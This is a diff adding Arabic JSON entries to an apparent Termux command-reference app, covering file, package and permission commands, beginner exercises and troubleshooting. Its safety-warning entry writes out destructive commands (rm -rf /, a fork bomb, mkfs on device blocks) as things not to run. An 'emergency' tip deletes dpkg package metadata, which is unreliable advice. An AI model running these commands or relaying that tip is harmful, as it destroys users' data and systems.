+        "syntax": "ssh [username]@[ip_address]\nssh user@192.168.1.100",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_termux_setup",
+        "name": "termux-setup-storage - صلاحيات التخزين",
+        "description": "يمنح Termux صلاحية الوصول إلى التخزين الداخلي للهاتف",
+        "syntax": "termux-setup-storage\n# بعد التنفيذ، ستظهر مجلد /sdcard للوصول إلى ملفات الهاتف",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_termux_clipboard",
+        "name": "termux-clipboard - نسخ ولصق",
+        "description": "ينسخ أو يلصق نصاً من وإلى الحافظة",
+        "syntax": "termux-clipboard-set [النص]   # نسخ نص\ntermux-clipboard-get          # لصق النص المنسوخ",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_man",
+        "name": "man - دليل المساعدة",
+        "description": "يعرض دليل المساعدة الكامل لأي أمر",
+        "syntax": "man [اسم الأمر]\nman ls                      # شرح كامل لأمر ls\nman cd",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_help",
+        "name": "--help - مساعدة سريعة",
+        "description": "يعرض مساعدة مختصرة لأي أمر (بديل سريع لـ man)",
+        "syntax": "[اسم الأمر] --help\nls --help\npython --help",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_ls_la",
+        "name": "ls -la - عرض مفصل مع الملفات المخفية",
+        "description": "يعرض جميع الملفات والمجلدات (بما فيها المخفية) مع التفاصيل",
+        "syntax": "ls -la",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_ls_lh",
+        "name": "ls -lh - عرض مع أحجام مقروءة",
+        "description": "يعرض الملفات مع أحجامها بشكل مفهوم (KB, MB, GB)",
+        "syntax": "ls -lh",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_cd_dotdot",
+        "name": "cd .. - الخروج من مجلد",
+        "description": "يخرج مجلداً واحداً إلى الخلف",
+        "syntax": "cd ..",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_cd_dotdotdot",
+        "name": "cd ../.. - الخروج مجلدين",
+        "description": "يخرج مجلدين إلى الخلف مرة واحدة",
+        "syntax": "cd ../..",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_cd_tilde",
+        "name": "cd ~ - العودة للمجلد الرئيسي",
+        "description": "ينتقل إلى المجلد الرئيسي للمستخدم (home directory)",
+        "syntax": "cd ~",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_cd_sdcard",
+        "name": "cd /sdcard - الوصول للتخزين الداخلي",
+        "description": "ينتقل إلى التخزين الداخلي للهاتف (يحتاج termux-setup-storage أولاً)",
+        "syntax": "cd /sdcard",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_cd_slash",
+        "name": "cd / - الذهاب إلى الجذر",
+        "description": "ينتقل إلى المجلد الجذر (root directory) في النظام",
+        "syntax": "cd /",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_cd_dash",
+        "name": "cd - - العودة للمجلد السابق",
+        "description": "ينتقل إلى المجلد الذي كنت فيه قبل الأمر الحالي",
+        "syntax": "cd -",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_mkdir_p",
+        "name": "mkdir -p - إنشاء مجلدات متداخلة",
+        "description": "ينشئ مجلدات داخل مجلدات (مثل إنشاء مسار كامل مرة واحدة)",
+        "syntax": "mkdir -p [مجلد/مجلد داخلي/مجلد أعمق]",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_rm_file",
+        "name": "rm - حذف ملف",
+        "description": "يحذف ملفاً واحداً نهائياً (لا يمكن استعادته)",
+        "syntax": "rm [اسم الملف]",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_rm_folder",
+        "name": "rm -r - حذف مجلد ومحتوياته",
+        "description": "يحذف مجلداً وكل ما فيه من ملفات ومجلدات فرعية",
+        "syntax": "rm -r [اسم المجلد]",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_rm_force",
+        "name": "rm -rf - حذف قسري (خطير جداً)",
+        "description": "يحذف الملفات والمجلدات بدون أي تأكيد (استخدم بحذر شديد)",
+        "syntax": "rm -rf [اسم الملف/المجلد]",
+        "difficulty": "متقدم",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_rm_all_txt",
+        "name": "rm *.txt - حذف كل ملفات txt",
+        "description": "يحذف جميع الملفات التي تنتهي بـ .txt في المجلد الحالي",
+        "syntax": "rm *.txt",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_cp_file",
+        "name": "cp - نسخ ملف",
+        "description": "ينسخ ملفاً من مكان إلى آخر",
+        "syntax": "cp [الملف الأصلي] [الوجهة]",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_cp_folder",
+        "name": "cp -r - نسخ مجلد كامل",
+        "description": "ينسخ مجلداً وجميع محتوياته إلى مكان آخر",
+        "syntax": "cp -r [المجلد الأصلي] [الوجهة]",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_mv_file",
+        "name": "mv - نقل ملف",
+        "description": "ينقل ملفاً من مكان إلى آخر (قص ولصق)",
+        "syntax": "mv [الملف] [المجلد/الوجهة]",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_mv_rename",
+        "name": "mv - إعادة تسمية ملف",
+        "description": "يعيد تسمية ملف أو مجلد (نفس الأمر mv)",
+        "syntax": "mv [الاسم القديم] [الاسم الجديد]",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_cat_create",
+        "name": "cat > - إنشاء ملف وكتابة فيه",
+        "description": "ينشئ ملفاً جديداً ويسمح بالكتابة فيه (اضغط Ctrl+D للحفظ)",
+        "syntax": "cat > [اسم الملف]",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_echo_write",
+        "name": "echo > - كتابة نص في ملف",
+        "description": "يكتب نصاً في ملف (يستبدل المحتوى القديم)",
+        "syntax": "echo [النص] > [اسم الملف]",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_echo_append",
+        "name": "echo >> - إضافة نص إلى ملف",
+        "description": "يضيف نصاً في نهاية الملف (لا يحذف المحتوى القديم)",
+        "syntax": "echo [النص] >> [اسم الملف]",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_tree_level2",
+        "name": "tree -L 2 - عرض مستويين فقط",
+        "description": "يعرض هيكل المجلدات بعمق مستويين فقط",
+        "syntax": "tree -L 2",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_tree_level3",
+        "name": "tree -L 3 - عرض ثلاثة مستويات",
+        "description": "يعرض هيكل المجلدات بعمق ثلاثة مستويات",
+        "syntax": "tree -L 3",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_tree_dirs",
+        "name": "tree -d - عرض المجلدات فقط",
+        "description": "يعرض المجلدات فقط دون الملفات",
+        "syntax": "tree -d",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_history_grep",
+        "name": "history | grep - البحث في سجل الأوامر",
+        "description": "يبحث عن أمر معين في سجل الأوامر السابقة",
+        "syntax": "history | grep [كلمة البحث]",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_chmod_plus",
+        "name": "chmod +x - جعل ملف قابلاً للتنفيذ",
+        "description": "يجعل الملف قابلاً للتشغيل (مثل تشغيل سكربت)",
+        "syntax": "chmod +x [اسم الملف]",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_chmod_777",
+        "name": "chmod 777 - صلاحيات كاملة (خطير)",
+        "description": "يمنح صلاحيات كاملة (قراءة، كتابة، تنفيذ) للجميع",
+        "syntax": "chmod 777 [اسم الملف]",
+        "difficulty": "متقدم",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_chmod_755",
+        "name": "chmod 755 - صلاحيات آمنة",
+        "description": "يمنح صلاحيات آمنة: للمالك كامل الصلاحيات، وللآخرين قراءة وتنفيذ فقط",
+        "syntax": "chmod 755 [اسم الملف]",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_grep_recursive",
+        "name": "grep -r - بحث في كل الملفات داخل مجلد",
+        "description": "يبحث عن كلمة معينة في كل الملفات داخل مجلد كامل",
+        "syntax": "grep -r [كلمة] [المجلد]",
+        "difficulty": "متقدم",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_find_name",
+        "name": "find -name - البحث عن ملف بالاسم",
+        "description": "يبحث عن ملف أو مجلد بالاسم في المجلد الحالي وما يحتويه",
+        "syntax": "find . -name [اسم الملف]",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_find_txt",
+        "name": "find *.txt - البحث عن كل ملفات txt",
+        "description": "يبحث عن جميع الملفات التي تنتهي بـ .txt",
+        "syntax": "find . -name \"*.txt\"",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_find_folders",
+        "name": "find -type d - البحث عن مجلدات فقط",
+        "description": "يبحث عن المجلدات فقط دون الملفات",
+        "syntax": "find . -type d",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_zip",
+        "name": "zip - ضغط ملفات",
+        "description": "يضغط ملفاً أو مجلداً إلى ملف بصيغة ZIP",
+        "syntax": "zip [الملف_المضغوط.zip] [الملف/المجلد]",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_unzip",
+        "name": "unzip - فك ضغط ZIP",
+        "description": "يفك ضغط ملف بصيغة ZIP في المجلد الحالي",
+        "syntax": "unzip [الملف.zip]",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_unzip_folder",
+        "name": "unzip -d - فك ضغط في مجلد محدد",
+        "description": "يفك ضغط الملف في مجلد معين",
+        "syntax": "unzip [الملف.zip] -d [المجلد]",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_wget_rename",
+        "name": "wget -O - تحميل باسم مختلف",
+        "description": "يحمل ملفاً ويحفظه باسم جديد تحدده",
+        "syntax": "wget -O [اسم جديد] [الرابط]",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_wget_continue",
+        "name": "wget -c - استكمال تحميل متقطع",
+        "description": "يستكمل تحميل ملف سبق وأن توقف",
+        "syntax": "wget -c [الرابط]",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_curl_download",
+        "name": "curl -O - تحميل ملف",
+        "description": "يحمل ملفاً من الإنترنت بنفس اسمه الأصلي",
+        "syntax": "curl -O [رابط الملف]",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_pkg_update",
+        "name": "pkg update - تحديث قائمة الحزم",
+        "description": "يحدث قائمة الحزم المتاحة للتثبيت",
+        "syntax": "pkg update",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_pkg_upgrade",
+        "name": "pkg upgrade - ترقية الحزم المثبتة",
+        "description": "يرقي جميع الحزم المثبتة إلى أحدث إصدار",
+        "syntax": "pkg upgrade",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_pkg_install",
+        "name": "pkg install - تثبيت حزمة",
+        "description": "يثبت حزمة جديدة في Termux",
+        "syntax": "pkg install [اسم الحزمة]",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_pkg_uninstall",
+        "name": "pkg uninstall - إلغاء تثبيت حزمة",
+        "description": "يحذف حزمة مثبتة من Termux",
+        "syntax": "pkg uninstall [اسم الحزمة]",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_pkg_list",
+        "name": "pkg list-all - عرض كل الحزم المتاحة",
+        "description": "يعرض قائمة بجميع الحزم التي يمكن تثبيتها",
+        "syntax": "pkg list-all",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_pkg_installed",
+        "name": "pkg list-installed - عرض الحزم المثبتة",
+        "description": "يعرض قائمة بجميع الحزم المثبتة حالياً",
+        "syntax": "pkg list-installed",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_pkg_search",
+        "name": "pkg search - البحث عن حزمة",
+        "description": "يبحث عن حزمة معينة في المستودعات",
+        "syntax": "pkg search [كلمة]",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_git_clone",
+        "name": "git clone - تحميل مشروع من GitHub",
+        "description": "ينسخ مشروعاً كاملاً من GitHub إلى جهازك",
+        "syntax": "git clone [رابط المشروع]",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_python_run",
+        "name": "python - تشغيل ملف بايثون",
+        "description": "يشغل ملف بايثون (ملف .py)",
+        "syntax": "python [اسم_الملف.py]",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_pip_install",
+        "name": "pip install - تثبيت مكتبة بايثون",
+        "description": "يثبت مكتبة أو حزمة بايثون",
+        "syntax": "pip install [اسم المكتبة]",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_termux_clipboard_set",
+        "name": "termux-clipboard-set - نسخ نص",
+        "description": "ينسخ نصاً إلى الحافظة (كليپبورد)",
+        "syntax": "termux-clipboard-set [النص]",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_termux_clipboard_get",
+        "name": "termux-clipboard-get - لصق نص",
+        "description": "يعرض النص الموجود في الحافظة",
+        "syntax": "termux-clipboard-get",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      }
+    ]
+  },
+  {
+    "id": "tool_termux_guide",
+    "name": "📖 دليل Termux التعليمي الشامل",
+    "commands": [
+      {
+        "id": "guide_welcome",
+        "name": "🎯 مرحباً بك في Termux",
+        "description": "Termux هو محاكي طرفية (Terminal Emulator) لنظام Android، يسمح لك بتشغيل أوامر Linux على هاتفك بدون الحاجة إلى صلاحيات روت. يمكنك من تثبيت الأدوات، برمجة، اختبار الاختراق، وغيرها الكثير.",
+        "syntax": "لا يوجد أمر - هذه معلومات إرشادية",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "guide_first_steps",
+        "name": "🔰 الخطوات الأولى بعد تثبيت Termux",
+        "description": "1️⃣ termux-setup-storage ← لتمكين الوصول للتخزين\n2️⃣ pkg update && pkg upgrade ← تحديث الحزم\n3️⃣ pkg install python git nano ← تثبيت الأساسيات\n4️⃣ cd /sdcard ← للوصول لملفات هاتفك\n5️⃣ ls ← لرؤية الملفات",
+        "syntax": "# نفذ الأوامر بالترتيب:\ntermux-setup-storage\npkg update && pkg upgrade -y\npkg install python git nano -y\ncd /sdcard\nls",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "guide_colors_meaning",
+        "name": "🎨 شرح ألوان الأوامر في Termux",
+        "description": "🔵 الأزرق = مجلدات (Directories)\n🟢 الأخضر = ملفات قابلة للتنفيذ (Executable)\n⚪ الأبيض/الرمادي = ملفات عادية\n🔴 الأحمر = ملف مضغوط أو ملف مهم\n🟡 الأصفر = ملف جهاز (Device file)\n🟣 البنفسجي = ملف صورة أو وسائط\n🔗 السماوي = رابط رمزي (Symlink)\n✨ الأخضر الغامق = ملف بصلاحيات خاصة",
+        "syntax": "# لعرض الألوان في مجلدك الحالي\nls --color=auto\n# لتخصيص الألوان\nexport LS_COLORS='di=34:ex=32:fi=0'",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "guide_error_types",
+        "name": "⚠️ أنواع الأخطاء الشائعة وكيفية حلها",
+        "description": "🔴 command not found ← الأمر غير مثبت → ثبته بـ pkg install [اسم الأمر]\n🔴 Permission denied ← صلاحيات غير كافية → استخدم chmod +x [الملف]\n🔴 No such file or directory ← الملف غير موجود → تحقق من المسار بـ ls\n🔴 Connection refused ← مشكلة اتصال → تحقق من الإنترنت\n🔴 Cannot connect to server ← الخادم لا يستجيب → جرب لاحقاً\n🔴 Out of memory ← ذاكرة غير كافية → أغلق تطبيقات أخرى\n🔴 Syntax error ← خطأ في كتابة الأمر → راجع الصياغة",
+        "syntax": "# مثال: حل مشكلة Permission denied\nchmod +x [اسم الملف]\n./[اسم الملف]\n\n# مثال: حل مشكلة command not found\npkg install [اسم الأمر]\nwhich [اسم الأمر]  # للتأكد من التثبيت",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      },
+      {
+        "id": "guide_keyboard_shortcuts",
+        "name": "⌨️ اختصارات لوحة المفاتيح في Termux",
+        "description": "📌 Ctrl + C ← إيقاف الأمر الحالي\n📌 Ctrl + D ← خروج من الجلسة\n📌 Ctrl + L ← مسح الشاشة\n📌 Ctrl + A ← الانتقال لبداية السطر\n📌 Ctrl + E ← الانتقال لنهاية السطر\n📌 Ctrl + U ← حذف كل السطر\n📌 Ctrl + W ← حذف كلمة خلف المؤشر\n📌 Ctrl + R ← البحث في سجل الأوامر\n📌 Ctrl + Z ← تعليق الأمر الحالي\n📌 ↑ / ↓ ← التنقل بين الأوامر السابقة\n📌 Tab ← إكمال تلقائي للأوامر والمسارات\n📌 حجم الصوت ↑ + Q ← إظهار لوحة مفاتيح إضافية",
+        "syntax": "# جرب هذه الاختصارات أثناء العمل\n# Ctrl + R ثم اكتب كلمة للبحث في السجل\n# Tab لإكمال اسم الملف تلقائياً",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "guide_emergency_commands",
+        "name": "🚨 أوامر الطوارئ (لحل أي مشكلة)",
+        "description": "🆘 إعادة تشغيل الجلسة: exit ثم افتح Termux مجدداً\n🆘 إصلاح الحزم المكسورة: pkg upgrade --fix-broken\n🆘 تنظيف ذاكرة التخزين المؤقت: pkg clean\n🆘 إعادة تعيين Termux بالكامل: اذهب إلى إعدادات الهاتف → تطبيقات → Termux → مسح البيانات\n🆘 إذا علقت الشاشة: Ctrl + C\n🆘 إذا لم يستجيب: اضغط على زر الرجوع مرتين\n🆘 استعادة الإعدادات الافتراضية: rm -rf $PREFIX/var/lib/dpkg/info && pkg update",
+        "syntax": "# أوامر الطوارئ\npkg upgrade --fix-broken\npkg clean\nexit\n# ثم أعد فتح Termux",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      },
+      {
+        "id": "guide_practical_exercise_1",
+        "name": "🏋️ تدريب عملي 1: إنشاء وتنقل",
+        "description": "📝 الهدف: تعلم إنشاء مجلدات والتنقل بينها\n✅ المطلوب:\n1. أنشئ مجلداً باسم my_training\n2. انتقل إلى داخله\n3. أنشئ ملفاً باسم hello.txt\n4. اكتب فيه 'مرحباً Termux'\n5. اعرض محتوى الملف\n6. ارجع إلى المجلد الرئيسي\n7. احذف المجلد الذي أنشأته",
+        "syntax": "# الحل خطوة بخطوة:\nmkdir my_training\ncd my_training\ntouch hello.txt\necho 'مرحباً Termux' > hello.txt\ncat hello.txt\ncd ~\nrm -r my_training",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "guide_practical_exercise_2",
+        "name": "🏋️ تدريب عملي 2: نسخ ونقل",
+        "description": "📝 الهدف: تعلم نسخ ونقل الملفات\n✅ المطلوب:\n1. أنشئ ملف source.txt\n2. انسخه إلى destination.txt\n3. أنشئ مجلد backup\n4. انقل destination.txt إلى مجلد backup\n5. تأكد من أن الملف موجود في المجلد الجديد",
+        "syntax": "# الحل:\ntouch source.txt\ncp source.txt destination.txt\nmkdir backup\nmv destination.txt backup/\nls backup/",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "guide_practical_exercise_3",
+        "name": "🏋️ تدريب عملي 3: بحث وفلترة",
+        "description": "📝 الهدف: تعلم البحث داخل الملفات\n✅ المطلوب:\n1. أنشئ ملف data.txt\n2. اكتب فيه 3 أسطر: 'apple', 'banana', 'grape'\n3. ابحث عن السطر الذي يحتوي على 'ana'\n4. ابحث عن كل ملفات .txt في المجلد الحالي",
+        "syntax": "# الحل:\necho 'apple' > data.txt\necho 'banana' >> data.txt\necho 'grape' >> data.txt\ngrep 'ana' data.txt\nfind . -name \"*.txt\"",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      },
+      {
+        "id": "guide_practical_exercise_4",
+        "name": "🏋️ تدريب عملي 4: الصلاحيات",
+        "description": "📝 الهدف: تعلم تغيير صلاحيات الملفات\n✅ المطلوب:\n1. أنشئ سكربت باسم script.sh\n2. اكتب فيه 'echo Hello'\n3. حاول تشغيله (سيظهر خطأ Permission denied)\n4. امنحه صلاحية التنفيذ\n5. شغله مرة أخرى",
+        "syntax": "# الحل:\necho 'echo Hello' > script.sh\n./script.sh  # خطأ: Permission denied\nchmod +x script.sh\n./script.sh  # يعمل: Hello",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      },
+      {
+        "id": "guide_tips_pro",
+        "name": "💡 نصائح احترافية للمحترفين",
+        "description": "🔹 استخدم alias لاختصار الأوامر الطويلة: alias ll='ls -la'\n🔹 استخدم && لتنفيذ أوامر متتالية: cd folder && ls\n🔹 استخدم | لنقل مخرجات أمر إلى آخر: ls | grep '.txt'\n🔹 استخدم > لحفظ المخرجات في ملف: ls > files.txt\n🔹 استخدم >> للإضافة إلى ملف: echo 'new' >> files.txt\n🔹 استخدم ; لتنفيذ أوامر حتى لو فشل أحدها: cd x; ls\n🔹 استخدم up arrow للوصول السريع للأوامر السابقة\n🔹 استخدم clear أو Ctrl+L لمسح الشاشة\n🔹 استخدم history لعرض كل الأوامر السابقة\n🔹 استخدم !! لإعادة آخر أمر",
+        "syntax": "# أمثلة:\nalias ll='ls -la'\ncd /sdcard && ls -la\nls | grep \"jpg\"\nls > myfiles.txt\necho \"نص جديد\" >> myfiles.txt\nhistory\n!!  # يعيد آخر أمر",
+        "difficulty": "متقدم",
+        "usageCount": 0
+      },
+      {
+        "id": "guide_safety_warning",
+        "name": "⚠️ تحذيرات أمان مهمة جداً",
+        "description": "🚫 لا تنسخ أوامر من مصادر غير موثوقة قبل فهمها\n🚫 أمر rm -rf / يحذف كل شيء (خطير جداً)\n🚫 لا تعطي صلاحيات 777 لملفات حساسة\n🚫 لا تشغل سكربتات لا تفهم محتواها\n🚫 احتفظ بنسخة احتياطية من ملفاتك المهمة\n🚫 استخدم VPN عند استخدام أدوات اختراق\n🚫 لا تخترق أجهزة الآخرين بدون إذن\n✅ Termux آمن إذا استخدمته بحذر",
+        "syntax": "# أمثلة على أوامر خطيرة (لا تشغلها):\n# rm -rf /   ← يمسح كل شيء\n# :(){ :|:& };:  ← فيروس شوكي (fork bomb)\n# mkfs.ext4 /dev/block/*  ← يخرب النظام",
+        "difficulty": "متقدم",
+        "usageCount": 0
+      },
+      {
+        "id": "guide_resources",
+        "name": "📚 مصادر مفيدة لتعلم Termux",
+        "description": "📖 الموقع الرسمي: termux.com\n📖 وثائق Termux: wiki.termux.com\n📖 مجتمع Termux: reddit.com/r/termux\n📖 قناة تيليجرام: t.me/termux\n📖 تعلم أوامر Linux: linuxcommand.org\n📖 كورسات مجانية: youtube.com (ابحث عن Termux tutorial)\n💡 نصيحة: ابدأ بالأوامر الأساسية ثم انتقل للأدوات المتقدمة تدريجياً",
+        "syntax": "# أوامر مساعدة:\nman [أمر]      # دليل كامل\n[أمر] --help   # مساعدة سريعة\npkg search [كلمة]  # بحث عن حزمة\npkg show [حزمة]    # معلومات عن حزمة",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "guide_common_commands_ref",
+        "name": "📋 مرجع سريع لأهم الأوامر",
+        "description": "📁 ls ← عرض الملفات\n📁 cd ← التنقل\n📁 pwd ← المسار الحالي\n📁 mkdir ← إنشاء مجلد\n📁 rm ← حذف\n📁 cp ← نسخ\n📁 mv ← نقل/تسمية\n📁 cat ← عرض ملف\n📁 nano ← تحرير ملف\n📁 grep ← بحث\n📁 find ← بحث متقدم\n📁 chmod ← صلاحيات\n📁 wget ← تحميل\n📁 git clone ← تحميل من GitHub\n📁 pkg install ← تثبيت حزمة\n📁 python ← تشغيل بايثون",
+        "syntax": "# أمثلة سريعة:\nls -la\ncd /sdcard\nmkdir new_folder\nrm file.txt\ncp file1 file2\nmv oldname newname\ncat file.txt\nnano file.txt\ngrep \"word\" file.txt\nchmod +x script.sh\nwget https://example.com/file.zip\ngit clone https://github.com/user/repo\npkg install python\npython script.py",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "guide_troubleshooting",
+        "name": "🔧 حل المشاكل الشائعة خطوة بخطوة",
+        "description": "❓ Termux يغلق فجأة؟ → جرب: pkg upgrade\n❓ لا يظهر مجلد /sdcard؟ → نفذ: termux-setup-storage\n❓ خطأ 'cannot connect to server'؟ → تحقق من اتصال الإنترنت\n❓ خطأ 'address already in use'؟ → المنفذ مشغول، استخدم منفذ آخر\n❓ التطبيق بطيء؟ → امسح ذاكرة التخزين المؤقت من إعدادات الهاتف\n❓ لا يمكن تثبيت حزمة؟ → نفذ: pkg update && pkg upgrade --fix-broken\n❓ الألوان لا تظهر؟ → نفذ: export TERM=xterm-256color\n❓ الأسهم لا تعمل؟ → اضغط مع الاستمرار على音量 + ثم Q",
+        "syntax": "# الحلول:\npkg upgrade --fix-broken\ntermux-setup-storage\nexport TERM=xterm-256color\n# أعد تشغيل Termux بعد هذه الأوامر",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      },
+      {
+        "id": "guide_daily_workflow",
+        "name": "📅 سير العمل اليومي المقترح في Termux",
+        "description": "🌅 صباحاً:\n1. pkg update && pkg upgrade (تحديث الحزم)\n2. cd إلى مجلد العمل\n3. ls -la لمراجعة الملفات\n\n📝 أثناء العمل:\n• استخدم Tab للإكمال التلقائي\n• استخدم Ctrl + R للبحث في السجل\n• احفظ أوامرك المفضلة في ملف .bashrc\n\n🌙 مساءً:\n• pkg clean (تنظيف الكاش)\n• exit (إغلاق الجلسة)\n\n💡 نصيحة: أنشئ ملف aliases.sh وضع فيه اختصاراتك المفضلة",
+        "syntax": "# إنشاء aliases.sh:\nnano ~/.bashrc\n# أضف الأسطر:\nalias update='pkg update && pkg upgrade'\nalias myls='ls -la --color=auto'\n# احفظ ثم نفذ:\nsource ~/.bashrc",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      }
+    ]
+  }
+]
